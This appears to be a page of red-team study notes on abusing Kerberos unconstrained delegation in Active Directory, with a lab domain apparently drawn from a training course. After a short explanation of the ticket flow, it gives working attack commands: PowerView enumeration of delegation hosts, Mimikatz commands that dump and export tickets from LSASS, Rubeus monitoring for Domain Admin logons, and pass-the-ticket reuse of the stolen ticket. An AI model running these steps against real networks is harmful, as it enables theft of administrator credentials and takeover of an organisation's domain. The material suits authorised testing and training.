---
description: >-
  Allows the first hop server to request access to any service on any computer
  in the domain.
---

# Unconstrained Delegation

## About

1. A user provides credentials to the Domain Controller.
2. The DC returns a TGT.
3. The user requests a TGS for the web service on Web Server.
4. The DC provides a TGS.
5. The user sends the TGT and TGS to the web server.
6. The web server service account use the user's TGT to request a TGS for the db server from the DC.
7. The web server service account connects to the db server as the user.

![](../../.gitbook/assets/image%20%285%29.png)

When unconstrained delegation is enabled, the DC places user's TGT inside TGS \(Step 4\). When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.

This could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.

## Enumeration

Discover domain computers which have unconstrained delegation enabled

```text
Get-NetComputer -Unconstrained
```

If any on the listed servers is compromised, we can proceed to dumping tickets.

## Dumping tickets

Check if DA ticket is available

```text
Invoke-Mimikatz â€“Command '"sekurlsa::tickets"'
```

We are looking for DA ticket

```text
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### Waiting for login

If the is not logged in, we can wait for authentication:

```text
.\Rubeus.exe monitor /interval:5 /nowrap
```

## Reusing the ticket

This has to be run on the same, compromised machine which has allowed "Unconstrained Delegation".

```text
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\182\[0;166db3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

Reusing ticket with Rubeus:

```text
 .\Rubeus.exe ptt /ticket:{b64_encoded_ticket}
```

